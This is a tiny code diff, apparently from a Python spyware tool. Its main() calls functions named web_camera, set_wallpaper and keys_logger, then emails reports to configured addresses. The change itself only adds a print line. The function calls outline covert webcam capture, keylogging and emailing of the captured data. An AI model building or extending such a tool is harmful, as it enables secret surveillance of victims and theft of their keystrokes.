@@ -229,6 +229,8 @@ def main():
     web_camera()
     set_wallpaper()
     keys_logger()
+
+    print('\n...\n')
     for email in Config.EMAIL_ADDRESS: send_report(email)
     print('\n...\n')
 
